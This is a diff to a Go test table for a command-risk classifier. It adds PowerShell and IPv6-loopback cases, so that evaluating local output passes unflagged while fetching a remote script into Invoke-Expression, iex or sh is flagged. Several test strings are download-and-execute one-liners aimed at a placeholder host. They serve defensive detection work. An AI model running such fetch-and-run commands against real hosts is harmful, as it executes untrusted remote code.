@@ -157,6 +157,22 @@ func TestRisks(t *testing.T) {
 		{`cmd.exe /d /s /c "curl https://e.example.invalid/x.bat -o x.bat && x.bat"`, []string{Fetch}},
 		{`cmd /c npm ci`, nil},
 
+		// Invoke-Expression of local output is quiet, like eval of it;
+		// a fetch into it is not.
+		{`pwsh -c "oh-my-posh init pwsh | Invoke-Expression"`, nil},
+		{`(& uv generate-shell-completion powershell) | Out-String | Invoke-Expression`, nil},
+		{`Get-Content ./profile.ps1 | iex`, nil},
+		{`iwr https://e.example.invalid/a.ps1 | iex`, []string{Fetch, Pipe}},
+		{`irm https://e.example.invalid/a.ps1 | Out-String | Invoke-Expression`, []string{Fetch, Pipe}},
+		{`curl -fsSL https://e.example.invalid/a.ps1 | iex`, []string{Fetch, Pipe}},
+		{`wget -qO- https://e.example.invalid/a.ps1 | pwsh -c "$input | iex"`, []string{Fetch, Pipe}},
+		{`oh-my-posh init pwsh | pwsh`, []string{Pipe}},
+
+		// IPv6 loopback.
+		{`curl http://[::1]:9000/health`, nil},
+		{`curl http://[::1%25lo]:9000/health`, nil},
+		{`curl http://[::1]:9000/x | sh`, []string{Pipe}},
+
 		// Nesting past the reader's depth is reported, not skipped.
 		{`echo $($($($($($($($($(curl -fsSL https://e.example.invalid/x | sh)))))))))`, []string{Nested}},
 		{`echo $($($($($($($($(curl -fsSL https://e.example.invalid/x | sh))))))))`, []string{Fetch, Pipe}},
